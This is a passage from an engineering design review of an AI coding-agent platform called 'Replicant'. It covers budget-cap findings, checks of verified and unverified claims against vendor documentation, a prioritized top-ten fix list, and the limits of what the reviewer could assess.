  - `gateway.md` §4.2: settlement uses the cost parsed from the stream, with an estimate only on client
    abort.
  - Risks: "a provider change could zero out usage. Mitigation: … an alert".
  - Break-glass points agentd at the enterprise gateway directly and "loses per-run budgets during the
    incident".
- **Fix.**
  - When usage is missing or zero on a 200, settle at the reserved estimate. Count these, and deny new
    admissions above N per minute.
  - Time-box break-glass (`breakGlass.maxMinutes`), with an enterprise-side hard cap on the break-glass
    credential.
- **Owner:** WS-03.

### R2-059 · Medium · Repair jobs on the same PR are unlimited once a job ends

- **Sections:**
  - `01-orchestration/graphs/pr-repair.md`: repair cycles default 5; "follow-up commands are new jobs".
  - `07-control-plane-and-ux/github-app.md`: `/replicant fix` on a PR not owned by a live job creates a
    `pr_repair` JobRequest.
  - The dedupe key includes `comment_id` (`triggers.md`).
- **Scenario.** A contested PR exhausts its 5 cycles. Reviewers keep typing `/replicant fix`, and each comment
  is a new job with a fresh budget. D-15's per-job bound is bypassed by making more jobs.
- **Fix.** Add `repair_limits.max_pr_repair_jobs_per_pr` (3) and `budgets.prLifetimeUsd`, enforced at
  intake by `(repo_id, pr_number)` lookup.
- **Owner:** WS-07, WS-01.

### R2-060 · Medium · The "job cap" is additive, so `budget_usd_max` is not a ceiling

- **Sections:**
  - `gateway.md` §6.1: job limit = `min(jobUsd, budget_usd_max) + approved extensions + repairCycleUsd per
    repair cycle`.
  - `job-request.schema.json`: `budget_usd_max` "Requester cap on job cost".
  - `eval-harness.md`: the per-case 6× cap is enforced "through `constraints.budget_usd_max`".
- **Scenario.** A default job can spend $40 + 2×$20 + 5×$15 = $155. Eval cases with scripted review rounds
  exceed their 6× cap, which corrupts cost comparisons.
- **Fix.** Define `effective = min(budget_usd_max, jobBaseUsd + extensions + cycles × repairCycleUsd)`,
  add `jobHardCapUsd`, and rename `jobUsd` to `jobBaseUsd`.
- **Owner:** WS-03, WS-06.

### R2-061 · Medium · Shadow evaluation spend is charged to the tenant's quota, and its $1,500 cap has no enforcer

- **Sections:**
  - `promotion.md` §5.2: "The shadow job runs in J's tenant namespace with J's tenant keys and quotas".
  - `promotion-policy.yaml`: `shadow.maxUsd: 1500`. No component sums shadow spend.
  - `cost.sql` has no evaluation-mode column.
- **Scenario.** A model candidate shadows 10% of an early-ring tenant's jobs. With up to three concurrent
  pipelines, the tenant's real jobs hit `tenant_quota_exhausted` (and R2-020 then shows them as "needs a
  human").
- **Fix.** Charge shadow runs to a pipeline counter `fgw:pipeline:<id>`. The release controller stops
  sampling at `shadow.maxUsd`. Add `evaluation_mode` to usage events and rollups.
- **Owner:** WS-06, WS-03.

### R2-062 · Medium · A maintenance sweep has no batch spend cap

- **Sections:**
  - `01-orchestration/graphs/maintenance-fanout.md`: 10 active children, but children in
    `waiting_external` release their slots.
  - `policy-budgets.yaml`: maintenance `jobUsd: 15`.
  - No batch USD limit exists.
- **Scenario.** A sweep over 1,500 repos with one repair cycle each costs about $45k. Two concurrent
  batches per tenant cost about $90k, and the only backstop is the optional tenant quota.
- **Fix.** Add `max_batch_usd`. The parent sums child spend from `batch.child_progress` and the cost ledger,
  and stops starting children at the cap.
- **Owner:** WS-01, WS-03.

### R2-063 · Medium · Judge spend cannot be recorded as specified

- **Sections:**
  - `eval-harness.md`: judges call as `svc_eval-worker` with `X-Replicant-Role: eval-judge`.
  - `gateway-interface.openapi.yaml` role enums and the `cost.sql` check constraint lack `eval-judge`.
  - eval-worker is not an accepted service caller.
- **Effect.** Judge calls are rejected, or their usage rows fail to insert, so `judge_cost_usd` and suite
  `maxUsd` accounting are wrong.
- **Fix.** Add the role to both enums, add eval-worker as a service caller, and add a per-case judge
  counter.
- **Owner:** WS-06, WS-03.

### R2-064 · Low · Workspace size and compute have no ceiling

- **Sections:**
  - `common.schema.json` and C-CRD `disk_quantity` accept any `Ti` value.
  - The VAP only requires that a limit exists.
  - Anything above 160 Gi goes to provisioned gp3.
  - USD budgets cover tokens only.
- **Fix.**
  - Add `runtime_selection.workspace.maxSize` (1 Ti), checked at bundle build and in VAP CEL.
  - Add `budgets.computeUsdPerJob` from `cost.run_resource_usage`.
- **Owner:** WS-02, WS-03.

**Also cost-relevant, reported above:**

- R2-012: a gateway outage triggers a thundering herd of re-provisioned sandboxes.
- R2-030: partitioned runs spend in parallel with their retries.
- R2-033: S3 throttling and node loss re-run 40-minute QA runs from zero.
- R2-043: `--max-turns` resets per steering message.

Log volume is capped by Loki per-tenant ingestion limits and transcript retention. I found no unbounded log
path.

---

## 6. Unverified and verified claims (lens 6)

### 6.1 Load-bearing `[unverified]` claims with weak or no fallback

There are about 207 real `[unverified` tags. About 60 are load-bearing, in 28 groups, and about 147 are
not: prices, flag spellings caught by CI, local-dev conveniences, and estimates. The full inventory is in
the reviewer's scratch file. The ones that matter:

| ID | Claim (file) | What breaks | Fallback as written | Assessment |
|---|---|---|---|---|
| R2-037 (High) | Kata sandboxes can reach ClusterIP Services under Cilium with `socketLB.hostNamespaceOnly` (`02-execution/runtime-evaluation.md` F-18, `[unverified: B-NET-01]`). The cited AWS sample says "Kata VMs cannot access Kubernetes Service ClusterIPs" on VPC CNI | repo-mirror is reached by ClusterIP (`agent-capabilities.md` §3), so Kata runs cannot fetch code | **None.** The §8.5 fallback rules do not cover B-NET-01 | Add rule 6: expose repo-mirror (and any in-cluster target) via an internal NLB plus `toFQDNs`, as the gateway and MCPs already are. Make B-NET-01 a gate on the Kata default. **WS-02** |
| R2-038 (Medium) | Kata `guestBlockDevice` enforcement (`workspace-storage.md` `[unverified: B-DISK-01/02/03]`) | ADR-014 hard limit for Kata, and the T-SBX-03 control ("workspace on guest block device") | Rules 3 and 4 fall back to `xfsProjectQuota` on **virtio-fs** and to `fixedSizeVolume`, also over virtio-fs | The fallback silently re-opens the virtiofsd escape surface that T-SBX-03 relies on removing. If guestBlockDevice fails, the threat model's residual for T-SBX-03 must rise, and WS-09 must re-approve. State that in rule 3. **WS-02, WS-09** |
| R2-039 (Medium) | `/var/log/pods` receives sandbox stdout under kata-clh, kata-fc, and gvisor (`08-observability/platform.md`; `controller.md` termination message) | The node log pipeline (Alloy secretfilter, attribution by path); controller failure messages | None for logs. `FallbackToLogsOnError` depends on the same files | Add to B-NET/B-DISK as B-LOG-01. Fallback: the entrypoint ships stdout over OTLP (it already has the endpoint). **WS-08, WS-02** |
| R2-040 (Medium) | Downward API annotation updates propagate into running Kata or gVisor pods (`controller.md` cancel-reason path; untagged; `cli-invocation.md` U-8 "Not checked") | The graceful cancel reason (`deadline`, `security`, `job_cancelled`) reaching the entrypoint | Covers takeover only | Deliver the cancel reason through the run inbox (`inbox/` control key, already C-ART `steering_control`), which works on every runtime. Tag the controller.md claim. **WS-02, WS-03** |
| R2-041 (Medium) | Artifactory Curation/Xray features for the 72 h freshness quarantine and malicious-package blocking (`agent-capabilities.md` §7) | T-SC-01 residual | "a replicant-owned resolver proxy (for example Verdaccio for npm, devpi for PyPI)" | Named but not designed, and nothing for Go, cargo, or Maven. Specify the proxy per ecosystem or accept the risk explicitly. **WS-09, WS-02** |
| R2-042 (Low) | Kyverno/policy-controller `awskms://` key references; Slack Grid org-wide payload fields; `aws:TokenIssueTime` revocation deny | Image signature admission; Grid approver identity; STS emergency revocation | None, none, and "wait ≤ 3,600 s" | Each needs a fallback line. For signatures: cosign public key as a PEM in the policy, rotated by IaC. **WS-09, WS-07** |

**Stale tags (resolved elsewhere, still tagged).** Remove these:

- `postgres-ownership.md:73` (Langfuse migrations);
- ADR-006:40 (`versioning_override`);
- `promotion.md:366` (start-time pin; V01-01 verified, so the 0% ramp workaround is unnecessary);
- `control-review.md` G-18 vs `secrets.md:112` (Grafana RDS IAM; V10-28 verified "no");
- `secrets.md:114` (Temporal `passwordCommand`, V10-12);
- `11-local-dev/adr/004` and `006` items verified in WS-07 and WS-10 ADRs.

**Contradicting `[verified]` tags.** `smee-client` "v4.4.3 [verified]" (`11-local-dev/adr/006`) vs
"5.0.0 [verified]" (`07…/adr/004`). This is moot once the tunnel default lands; fix it in the same round.

### 6.2 Spot-checks of `[verified]` claims (13, checked 2026-10-24 against primary sources)

| # | Claim (where) | Source re-checked | Result |
|---|---|---|---|
| 1 | Worker Versioning GA; upgrade-on-Continue-As-New public preview (FROZEN facts; `versioning.md`) | temporal.io blog "Announcing GA for Worker Versioning and Public Preview for Upgrade on Continue-as-New" (2026-03-30); docs.temporal.io upgrade-on-continue-as-new | **Holds** |
| 2 | `temporalio-langgraph` 0.1.0, Beta, Public Preview (`architecture.md`, `temporal-langgraph.md`) | pypi.org/project/temporalio-langgraph (0.1.0, 2026-10-07, "4 - Beta"); docs.temporal.io LangGraph page | **Holds, with a nuance.** The official docs page documents only `temporalio[langgraph]` / `temporalio.contrib.langgraph` and does not mention the standalone package. FROZEN's "moving to the standalone package" is inferred from PyPI and samples, not stated by the docs. Harmless given ADR-01-001 (no runtime dependency) |
| 3 | Temporal limits 51,200 events / 50 "MiB" error, 10,240 / 10 MiB warn (`history-budget.md`) | docs.temporal.io self-hosted defaults | **Holds.** The unit is MB, not MiB (trivial). Note also the 2 MB per-payload error / 512 KB warn, which matter for summaries carried in history |
| 4 | `CLAUDE_CODE_MAX_RETRIES` default 10, cap 15 (`gateway.md` §1) | code.claude.com env-vars | **Holds, but incomplete.** "Capped at 15 as of v2.1.186; as of v2.1.199, `CLAUDE_CODE_RETRY_WATCHDOG` raises the default and removes the cap." The pinned CLI (2.1.240+) has the watchdog. The agentd retry design must set `CLAUDE_CODE_RETRY_WATCHDOG` explicitly off (or account for it), or the retry budget in `gateway.md` §6 is not what runs (WS-03, low) |
| 5 | `--max-turns` with stream-json steering: a steering message "counts against `--max-turns` as its own turn" (`cli-invocation.md` §2.6) | code.claude.com cli-reference | **Contradicted.** The docs say: "With `--input-format stream-json`, a message still queued when the limit ends a turn stays queued and **starts a new turn with its own limit**." Each steering message resets the turn cap, so `max_turns` is per user message, not per run. See R2-043 |
| 6 | ADR-010: `-p` with `--input-format stream-json` keeps queued user messages across turns (`00-contracts/adr/010`) | code.claude.com cli-reference (`--max-turns`, `--replay-user-messages` entries) | **Now holds.** The docs explicitly describe queued messages in stream-json input. The verification log (V00-42) recorded this as "inferred", so the inline tag was stronger than its evidence at the time. Update V00-42 with this citation |
| 7 | KMS ECC Sign quota 1,000 RPS shared (`threat-model.md` T-DOW-07) | docs.aws.amazon.com KMS requests-per-second | **Holds** (table: "1,000 (shared) for elliptic curve (ECC)"). The same page's prose example still says "500 … RSA … 300 … ECC". Size against the table, but alert at 30% of quota, not 80% |
| 8 | Role-chaining sessions capped at 1 h (`threat-model.md` §4.3, V00-27) | IAM User Guide "Methods to assume a role" | **Holds** |
| 9 | EKS Pod Identity session tags (six keys) for ABAC trust policies (`09-security/adr/003`) | docs.aws.amazon.com eks pod-id-abac | **Holds.** Tags are transitive across role chaining, which the sandbox-artifacts trust relies on |
| 10 | Nested virtualization on non-metal M8id/C8id (`runtime-evaluation.md` A-1) | EC2 User Guide nested virtualization | **Holds.** The page adds "AWS recommends … performance sensitive … evaluate bare metal". Keep fallback rule 1 (metal) funded |
| 11 | S3 Object Lock governance bypass needs `s3:BypassGovernanceRetention` plus header; compliance blocks root (`10-data-platform/adr/009`) | S3 User Guide Object Lock | **Holds.** Unmentioned in the spec: a **legal hold** blocks deletion regardless of bypass (relevant to R2-005) |
| 12 | Loki `deletion_mode: filter-and-delete` and cancel period (`session-capture.md` §8.1) | grafana.com Loki logs-deletion | **Holds.** The default `delete_request_cancel_period` is 24 h; the spec explicitly sets 2 h, which is fine but must be set in `loki.yaml` (it is) |
| 13 | GitHub check-run `actions`: ≤ 3, label ≤ 20, description ≤ 40, identifier ≤ 20 (`approvals.md` §5) | docs.github.com REST check runs | **Holds** |

Also checked to support R2-001: GitHub App installation tokens trigger `pull_request` workflows without
approval (docs.github.com, *Triggering a workflow*). And to support R2-003: the Go module reference
confirms proxies receive full module paths. That proxy.golang.org fetches from origin on a miss is standard
documented behaviour (proxy.golang.org FAQ), though the go.dev/ref/mod page I fetched does not state it in
the section I read.

#### R2-043 · Medium · `--max-turns` is per user message under stream-json steering, not per run

- **Sections:** `03-agents-and-tools/cli-invocation.md` §2.6 ("it counts against `--max-turns` as its own
  turn") and §2.3 (`--max-turns 200` as a run cap).
- **Scenario.** A requester steers 10 times. Each steering message grants a fresh 200-turn allowance, so a
  looping agent gets 2,000 turns. The gateway `budget_usd` is still the hard stop, so the issue is cost
  predictability and wall-clock, not unbounded spend.
- **Fix.** Count turns in agentd (from `result.num_turns` across results) and send the finalize message or
  SIGINT at `plan.effective.max_turns` cumulative. Correct the text, and add a contract test against the
  pinned CLI.
- **Owner:** WS-03.

---

## 7. Top ten to fix first

| Rank | ID | Why first |
|---|---|---|
| 1 | **R2-001** | Live, unbounded exposure: agent-written code runs in target CI with production secrets before any human sees it. Rules-only fix; no contract change |
| 2 | **R2-002** | Breaks D-04's core idempotency promise on the first Runner retry. One-line contract fix (exclude `trace_context` from `spec_digest`) and it must land before C-RUNNER consumers build |
| 3 | **R2-010** | Turns every dependency outage into mass job failure with no compensation. It is the root of several other failure findings (R2-012, R2-015, KMS/codec) |
| 4 | **R2-011** | Approvals silently lost on a routine Aurora failover. That is Replicant's most important human interaction |
| 5 | **R2-016** | No global kill switch, and the fallback depends on the failed database. Needed before the first production incident |
| 6 | **R2-005** with **R2-004** | Decide the leak-purge design now: split history exports and make approval records reference-only. This removes the standing governance bypass and makes the audit invariant true. Both touch C-ART |
| 7 | **R2-017** | Without a post-merge "wrong" signal, memory, metrics, and promotion all learn from plausible wrong fixes. This is Replicant's improvement loop running backwards |
| 8 | **R2-055** with **R2-056** | No tenant or platform spend ceiling, and evals can re-run $20k suites without limit |
| 9 | **R2-003** | A working, high-bandwidth exfiltration channel through the Go module proxy. Mirror config fix |
| 10 | **R2-006** | A threat-model control (test deletion or skip vs base) that nothing implements. Approvers are told QA passed when tests were removed |

Next in line: R2-045 (runtime emergency override), R2-044 (model retirement and job age cap), R2-021
(rollback blast radius and packet banner), and R2-037 (Kata ClusterIP gate).

## What I could not assess

- **CEL admission policies and Kata hardening keys.** I did not run them against a live API server or the
  pinned Kata release. WS-09 says the same, and R2-038 depends on that work.
- **Runtime benchmark gates** (B-NET-01, B-DISK-*, B-LOG). These are design-time unknowns. I assessed their
  fallbacks, not their outcomes.
- **Enterprise gateway capabilities** (OQ-00-09) and **Artifactory edition features.** These are external
  facts no workstream could confirm.
- **The `proxy.golang.org` on-demand origin fetch** (R2-003). I relied on standard documented Go proxy
  behaviour. The page I fetched (go.dev/ref/mod) did not state it in the part I read. WS-09 should confirm
  it against the proxy.golang.org FAQ and their Artifactory remote configuration.
- **Interactive behaviour in the prototype** (keyboard flows, motion, SSE reconnect). I reviewed only the
  static screenshots.
